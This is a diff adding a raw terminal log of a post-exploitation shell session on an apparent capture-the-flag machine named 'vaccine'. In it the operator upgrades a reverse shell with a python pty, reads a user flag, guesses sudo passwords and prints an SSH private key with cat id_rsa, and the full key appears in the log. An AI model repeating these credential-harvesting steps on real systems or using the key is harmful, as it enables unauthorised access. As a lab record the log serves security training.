@@ -1,0 +1,134 @@
+bash: cannot set terminal process group (3327): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ <in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+postgres@vaccine:/var/lib/postgresql/11/main$ 
+postgres@vaccine:/var/lib/postgresql/11/main$ export TERM=xterm
+postgres@vaccine:/var/lib/postgresql/11/main$ [H[2Jpostgres@vaccine:/var/lib/postgresql/11/main$ ls -la
+total 92
+drwx------ 19 postgres postgres 4096 Sep 10 05:25 .
+drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 ..
+drwx------  6 postgres postgres 4096 Jul 23  2021 base
+drwx------  2 postgres postgres 4096 Sep 10 05:26 global
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_commit_ts
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_dynshmem
+drwx------  4 postgres postgres 4096 Sep 10 05:25 pg_logical
+drwx------  4 postgres postgres 4096 Jul 23  2021 pg_multixact
+drwx------  2 postgres postgres 4096 Sep 10 05:25 pg_notify
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_replslot
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_serial
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_snapshots
+drwx------  2 postgres postgres 4096 Sep 10 05:25 pg_stat
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_stat_tmp
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_subtrans
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_tblspc
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_twophase
+-rw-------  1 postgres postgres    3 Feb  3  2020 PG_VERSION
+drwx------  3 postgres postgres 4096 Jul 23  2021 pg_wal
+drwx------  2 postgres postgres 4096 Jul 23  2021 pg_xact
+-rw-------  1 postgres postgres   88 Feb  3  2020 postgresql.auto.conf
+-rw-------  1 postgres postgres  130 Sep 10 05:25 postmaster.opts
+-rw-------  1 postgres postgres  108 Sep 10 05:25 postmaster.pid
+postgres@vaccine:/var/lib/postgresql/11/main$ cd ..
+postgres@vaccine:/var/lib/postgresql/11$ ls
+main
+postgres@vaccine:/var/lib/postgresql/11$ cd ..
+postgres@vaccine:/var/lib/postgresql$ lks[K[Ks -la
+total 24
+drwxr-xr-x  5 postgres postgres 4096 Oct 11  2021 .
+drwxr-xr-x 39 root     root     4096 Jul 23  2021 ..
+drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 11
+lrwxrwxrwx  1 root     root        9 Feb  4  2020 .bash_history -> /dev/null
+drwxrwxr-x  3 postgres postgres 4096 Jul 23  2021 .local
+lrwxrwxrwx  1 root     root        9 Feb  4  2020 .psql_history -> /dev/null
+drwx------  2 postgres postgres 4096 Jul 23  2021 .ssh
+-r--------  1 postgres postgres   33 Oct 11  2021 user.txt
+postgres@vaccine:/var/lib/postgresql$ cat user.txt 
+ec9b13ca4d6229cd5cc1e09980965bf7
+postgres@vaccine:/var/lib/postgresql$ sudo -l
+[sudo] password for postgres: 
+Sorry, try again.
+[sudo] password for postgres: 
+Sorry, try again.
+[sudo] password for postgres: 
+sudo: 3 incorrect password attempts
+postgres@vaccine:/var/lib/postgresql$ cd .ssh
+postgres@vaccine:/var/lib/postgresql/.ssh$ ls
+authorized_keys  id_rsa  id_rsa.pub
+postgres@vaccine:/var/lib/postgresql/.ssh$ ca[K[Kcd /home
+postgres@vaccine:/home$ ls
+ftpuser  simon
+postgres@vaccine:/home$ cd simon/
+postgres@vaccine:/home/simon$ ls -la
+total 28
+drwxr-xr-x 4 simon simon 4096 Jul 23  2021 .
+drwxr-xr-x 4 root  root  4096 Jul 23  2021 ..
+lrwxrwxrwx 1 root  root     9 Feb  4  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 simon simon  220 May  5  2019 .bash_logout
+-rw-r--r-- 1 simon simon 3771 May  5  2019 .bashrc
+drwx------ 2 simon simon 4096 Jul 23  2021 .cache
+drwx------ 3 simon simon 4096 Jul 23  2021 .gnupg
+-rw-r--r-- 1 simon simon  807 May  5  2019 .profile
+postgres@vaccine:/home/simon$ cd -
+/home
+postgres@vaccine:/home$ cd /var/lib/postgresql
+postgres@vaccine:/var/lib/postgresql$ cd .ssh
+postgres@vaccine:/var/lib/postgresql/.ssh$ ls
+authorized_keys  id_rsa  id_rsa.pub
+postgres@vaccine:/var/lib/postgresql/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA0a5cdsLhNwBeZvZB5tYxL80+03AaJwcnAyEzffSXcluql1xNztZr
+JkMxml3K1zs8pOxUv9WALP9BIDh1aHITP8i273Uz5PC3RBzQuP8gAkdI6UxeNuwJ7FYyTQ
+jGUjyxlsGbPX3noMsKzeOa4pK5LkOy72Wh7QphvfSVPmVtmEMotFVI8Jc1gPsgVvpP0sM9
+IyuyTWfMuPhvreyO4DCerRZY95ClNgkffiudHiSFc72ps/8n4JFNqT3Y8efovm/SdWr9SG
+z20+gKBUk/9Of5HGAUCG7/Z1Li9FdQn3rqikfXn5D4eZBX8/kfrfDi82A/oheQKM7oZrm9
+fAiZAiJTbUrwNri7GPbjmw0/uqgFAuWOXo/MooksOIsAmU9PW2rEqUrNHHO7mSUDl1N45W
+TOU8Sh94oLeD+7RVQiKVVjj+jzlXmcGjgij8QgpWNtd7gorHHe3+m2TMzsL65cctaH4pnm
+d38FTKBmDLLh9SU4JIQQuzTLvBv0e6xLv5WU6uflAAAFiLcLrEC3C6xAAAAAB3NzaC1yc2
+EAAAGBANGuXHbC4TcAXmb2QebWMS/NPtNwGicHJwMhM330l3JbqpdcTc7WayZDMZpdytc7
+PKTsVL/VgCz/QSA4dWhyEz/Itu91M+Twt0Qc0Lj/IAJHSOlMXjbsCexWMk0IxlI8sZbBmz
+1956DLCs3jmuKSuS5Dsu9loe0KYb30lT5lbZhDKLRVSPCXNYD7IFb6T9LDPSMrsk1nzLj4
+b63sjuAwnq0WWPeQpTYJH34rnR4khXO9qbP/J+CRTak92PHn6L5v0nVq/Uhs9tPoCgVJP/
+Tn+RxgFAhu/2dS4vRXUJ966opH15+Q+HmQV/P5H63w4vNgP6IXkCjO6Ga5vXwImQIiU21K
+8Da4uxj245sNP7qoBQLljl6PzKKJLDiLAJlPT1tqxKlKzRxzu5klA5dTeOVkzlPEofeKC3
+g/u0VUIilVY4/o85V5nBo4Io/EIKVjbXe4KKxx3t/ptkzM7C+uXHLWh+KZ5nd/BUygZgyy
+4fUlOCSEELs0y7wb9HusS7+VlOrn5QAAAAMBAAEAAAGBALnYaB3fFsywJ/vsUnbt68Spjw
+DKwHNNFJfiiogeDUmP08C6UEB+rZPJRKLEdO+Vkme/DFLHQgcf6rJLOEztpwAGv5W39Nn7
+PQRC4gDGJ7G9SvN0+6CETztJHuZGW7kyEFlFmnnDKVTMAfSAwpwFXdqSqHslQoMdi4pYyR
+r3vU6SX/aODMspyoNakcxlqfBtmbedmDihQsPDdwDZxb0ReuKBBzPN4ZDmPyKON4Eq75mp
+RkvCYK7bOtFBfxLR8Okxo+R/wjeVx30VXmUyypjZXGZyzvLjO0PihTH0RKpa7TMczD54CZ
+08gjPh7CYYIhbU97GV7tFivPWn22J2c6zQ7s0LbG0p7OHAolGzqRdi5BJx1IObPkUbbDJS
+9V0DK60SCPMjqWTNRyYmb2pmmePSvohZClbTmdT+u2uXafuRGjT7vQIxo988/DJe8bMyar
+QX5CDLOdIFaaQ6JeNZWcIedVvqw3b4pu9X+7mkhLxAX82rG6yZxvQyHZxoIhrK9zMNtQAA
+AMEA55ZweCyUhPlvJETPWoO0N6VGoeHmCGYFyyG4LM9yrRCFLCkVup9cYRUcwP722wg/rL
+Ll46DwHOIeyTtPfh9MNePfxiiOmK0paDPeFtMS2xDgzfnMBTmeQOefnXOsYgIdyVGkOWbq
+7v7/odGoZBiJK8LXkyP/p4rtTHVLLcUECJzfgmHQ+dn9usAeH776ieUX1+O9ncnqT/+nj3
+jDj/rX/jywi0hCpre626ghx5QOo/HZeWKgjF3a4EGvzGxxTchhAAAAwQD947wDgXlPNM5j
++DZ5NYhQnb1E0xGQjdOl4jibokcXjjxZ6pXrbhy7TQCuE+RqHs55zywOTyXf+IHJ5uJ6O1
+Owe+ZkLLldaQUA4xQN7fRlcZR6NXlUDTaxZIR4/6/n7trs4rAnhfm42M8I8dFgCWzDgaMB
++s1KdzNJAlOER3T9gxHzwBP9ELtad6v7rvywSf9Zwv3MlXse1tGUukauWwWyFYv2UA5z4G
+wwp3pWDQsygbyBcPKj/2aXL0GmvAOjaAcAAADBANNsjZdelWNlS1E01PyGCGG+Un2PgAiS
+ZhzW3CmpYvmtZ+e6LEDLwq7nPShhs9oplWiMyemUz7ukTeREvZ3OyaBR2avgcZsg1eWDsL
+Esek1du7fMGy8Y/XUjMtAX8sNvne1gaVKGiFNGKjsab/vxT9eClYo9kgt+MqS9opzX7WPu
+7Dj1cDAVWXOqAJO9Ks3PLh6P7eP36lg2w/4/CHkvTmdJ9yr7nLclP5QS/gWghlTl2SkoIq
+r1Y3QWupZhHES9swAAABBwb3N0Z3Jlc0B2YWNjaW5lAQ==
+-----END OPENSSH PRIVATE KEY-----
+postgres@vaccine:/var/lib/postgresql/.ssh$ ls
+authorized_keys  id_rsa  id_rsa.pub
+postgres@vaccine:/var/lib/postgresql/.ssh$ cd ..
+postgres@vaccine:/var/lib/postgresql$ ls
+11  user.txt
+postgres@vaccine:/var/lib/postgresql$ cd ..
+postgres@vaccine:/var/lib$ ls
+AccountsService    git		    php		      ubuntu-release-upgrader
+apache2		   grub		    plymouth	      ucf
+apt		   initramfs-tools  polkit-1	      update-manager
+boltd		   landscape	    postgresql	      update-notifier
+cloud		   logrotate	    private	      usbutils
+command-not-found  man-db	    python	      vim
+dbus		   misc		    snapd	      vmware
+dhcp		   os-prober	    sudo
+dpkg		   PackageKit	    systemd
+fwupd		   pam		    ubuntu-advantage
+postgres@vaccine:/var/lib$ bash: [3330: 2 (255)] tcsetattr: Inappropriate ioctl for device
+postgres@vaccine:/var/lib/postgresql/11/main$ exit
